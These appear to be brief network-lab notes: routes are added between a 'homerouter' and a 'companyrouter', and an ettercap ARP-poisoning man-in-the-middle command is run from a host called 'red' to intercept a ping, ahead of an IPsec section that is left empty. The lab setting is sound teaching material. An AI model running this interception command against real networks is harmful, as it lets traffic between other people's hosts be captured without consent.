# Set up and verify the network

## Adding routes between companyrouter and homerouter

**On homerouter:**

```bash
ip route add 172.30.0.0/16 via 192.168.62.253
```

**On companyrouter:**

```bash
ip route add 172.10.10.0/24 via 192.168.62.42
```

## MitM attack

**On red:**

```bash
sudo ettercap -Tq -i eth0 -M arp:remote /192.168.62.42// /192.168.62.253//
```

-   Task: can you intercept a ping from remote_employee to a VM behind companyrouter?

    Yes.

## IPsec set-up
